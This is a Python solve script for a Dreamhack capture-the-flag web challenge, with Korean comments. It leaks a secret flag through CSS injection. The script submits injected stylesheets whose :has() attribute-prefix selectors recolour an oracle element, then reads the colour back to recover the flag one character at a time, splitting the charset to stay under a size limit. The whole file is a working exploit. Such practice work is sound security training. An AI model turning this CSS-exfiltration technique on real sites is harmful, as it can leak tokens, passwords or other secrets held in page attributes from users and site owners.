import requests
import string
import time
import re
import sys

# ==========================================
# [설정 영역]
TARGET_URL = "http://host3.dreamhack.games:13212"
TARGET_URL = TARGET_URL.rstrip('/')
# ==========================================

def solve():
    known_flag = "DH{"
    # 특수문자 중 CSS 선택자에 문제를 덜 일으키는 안전한 문자들만 포함
    charset = string.ascii_letters + string.digits + "{}_-!?"
    
    # 5000바이트 제한을 넉넉히 우회하기 위해 문자셋을 3개의 청크(Chunk)로 나눔
    chunk_size = len(charset) // 3 + 1
    chunks = [charset[i:i + chunk_size] for i in range(0, len(charset), chunk_size)]
    
    session = requests.Session()
    
    while True:
        found_char = False
        print("\n" + "="*60)
        print(f"[DEBUG] 현재까지 파악된 플래그: '{known_flag}'")
        print("="*60)
        
        for chunk_idx, chunk in enumerate(chunks):
            print(f"[DEBUG] Chunk {chunk_idx + 1}/{len(chunks)} 시도 중... (검사할 문자: {chunk})")
            
            # 기본 오라클 색상을 rgb(128, 0, 0)으로 덮어씌움
            css = "#oracle { background: rgb(128, 0, 0) !important; }\n"
            
            for c in chunk:
                guess = known_flag + c
                # DOM 구조가 정확히 어떤 속성(value 또는 data-secret)을 쓸지 모르므로 둘 다 때려넣음
                # 아스키코드를 B(Blue) 값으로 사용하여 문자를 식별 (예: rgb(0, 0, 97) -> 'a')
                css += f':root:has([value^="{guess}"]) #oracle{{background:rgb(0,0,{ord(c)})!important}}\n'
                css += f':root:has([data-secret^="{guess}"]) #oracle{{background:rgb(0,0,{ord(c)})!important}}\n'
            
            print(f"[DEBUG] 전송할 CSS 크기: {len(css)} bytes")
            
            try:
                # 1. CSS 제출
                resp = session.post(f"{TARGET_URL}/submit", data={"css": css})
                
                # 리다이렉트된 URL에서 리포트 번호(idx) 추출
                idx_match = re.search(r'/view/(\d+)', resp.url)
                idx = idx_match.group(1) if idx_match else "최신"
                print(f"[DEBUG] CSS 제출 완료. 부여된 인덱스: #{idx}")
                
                # 서버에서 DOM 렌더링을 끝낼 수 있도록 아주 약간의 딜레이
                time.sleep(0.5)
                
                # 2. 메인 페이지(/)를 긁어와서 오라클 결과(rgb) 확인
                main_resp = session.get(f"{TARGET_URL}/")
                
                if idx != "최신":
                    color_pattern = rf"View #{idx}:\s*rgb\((\d+),\s*(\d+),\s*(\d+)\)"
                else:
                    # idx 파싱 실패 시 가장 마지막 줄의 rgb를 찾음
                    color_pattern = r"View #\d+:\s*rgb\((\d+),\s*(\d+),\s*(\d+)\)"
                    
                matches = re.findall(color_pattern, main_resp.text)
                
                if matches:
                    r, g, b = matches[-1]
                    result_color = f"rgb({r}, {g}, {b})"
                    print(f"[DEBUG] 오라클 반환 색상: {result_color}")
                    
                    if result_color == "rgb(128, 0, 0)":
                        print("[DEBUG] -> 이 Chunk에는 일치하는 문자가 없습니다. 다음 청크로 넘어갑니다.")
                        continue
                    elif r == "0" and g == "0":
                        # B값이 우리가 설정한 아스키코드이므로 다시 문자로 변환!
                        matched_char = chr(int(b))
                        known_flag += matched_char
                        print(f"\n[SUCCESS] >>> 일치하는 문자 찾음: '{matched_char}' <<<")
                        found_char = True
                        break
                    else:
                        print(f"[WARNING] 예상치 못한 색상이 반환되었습니다: {result_color}")
                else:
                    print("[ERROR] 메인 페이지에서 색상 결과를 정규식으로 찾을 수 없습니다.")
                    sys.exit(1)
                    
            except Exception as e:
                print(f"[ERROR] HTTP 요청 중 에러 발생: {e}")
                sys.exit(1)
        
        if not found_char:
            print("\n[ERROR] 모든 청크를 시도했지만 일치하는 문자가 없습니다.")
            print("[ERROR] 플래그가 끝났거나 DOM의 속성 이름(value, data-secret 등)이 다를 수 있습니다.")
            break
            
        if known_flag.endswith("}"):
            print("\n" + "*"*60)
            print(f"🎉 [완료] 최종 플래그 획득: {known_flag}")
            print("*"*60)
            break

if __name__ == "__main__":
    solve()